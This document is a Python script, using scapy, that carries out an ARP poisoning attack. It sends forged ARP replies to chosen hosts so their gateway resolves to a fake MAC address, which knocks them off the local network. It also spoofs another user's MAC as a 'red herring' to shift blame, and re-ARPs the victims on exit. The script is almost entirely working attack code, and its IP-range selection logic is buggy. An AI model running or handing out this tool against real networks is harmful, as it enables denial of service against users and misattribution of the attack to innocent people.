#!/usr/bin/env python

from scapy.all import *
import time
import signal
import sys
from hosts import * 
import netifaces


def createPacket(victimIP, victimMAC, deadEndIP, deadEndMAC, poison):
	
	
	myMAC = "08:00:27:f7:e8:72"		#MAC address of origin of poisioning 
					#set as another users MAC for Red herring attempt
	if poison == True:
		dstMAC = "08:00:27:ff:ff:fe"		#False MAC address
	else:
		dstMAC = deadEndMAC

	#Creating Poisoning packet

	#Ethernet*****************
	pkt = Ether()/ARP()	
	pkt.dst = victimMAC		#Ethernet Destination
	pkt.src = myMAC			#Ethernet Source
	#************************
	
	#ARP**********************
	pkt.pdst= victimIP		# (IP)
	pkt.hwdst = victimMAC		# (MAC)Hey just to let you know...	
	pkt.psrc = deadEndIP		# if you're trying to talk to...
	pkt.hwsrc = dstMAC		# His MAC address is ...
	pkt.op = 2			# that's where he's at (is-at)
	#*************************
	return pkt

def getTargets(hosts):
	print "Select target IP address/range:"
	print "e.g. 192.168.56.23 OR \n192.168.56.26,192.168.56.32,192.168.56.72 OR \n192.168.56.100-192.168.56.200"
	IPstring = raw_input()

	targets = {}

	if "-" in IPstring:
		index = IPstring.find("-")

		minIP = IPstring[:index:]
		maxIP = IPstring[index+1::]


		for IP in hosts:
			if IP >= min or IP <= max:
				targets[IP] = hosts[IP]

	elif "," in IPstring:	

		while "," in IPstring:
			index = IPstring.find(",")

			IP = IPstring[:index:]

			targets[IP] = hosts[IP]

			IPstring = IPstring[index+1::]

		targets[IPstring] = hosts[IPstring] #should contain the last IP address

	else:
		targets[IPstring] = hosts[IPstring]
		
	return targets

print "Available interfaces"

for interface in netifaces.interfaces():
	print interface,
print
interface = raw_input("What interface would you like to use?:\n")

machines = getNetwork(interface)

victims = getTargets(machines)

router = min(machines)

if router in victims:
	del victims[router]	#In case router was selected as a victim

print router

packets = []

for ip, info in victims.iteritems():
	packets.append( createPacket(ip,info[0], router, machines[router][0], True) )


print("Turn out the lights....")

try:
	while True:
		for pkt in packets:
			sendp(pkt, iface=interface)
			
		time.sleep(2)

except KeyboardInterrupt:
	print("Re-ARPing....")

	healPacks = []

	for ip, info in victims.iteritems():
		healPacks.append(createPacket(ip,info[0],router,machines[router][0], False))

	for i in range(0, 5):
		for heal in healPacks:
			sendp(heal, iface=interface)
			
		time.sleep(1)

	sys.exit(0)
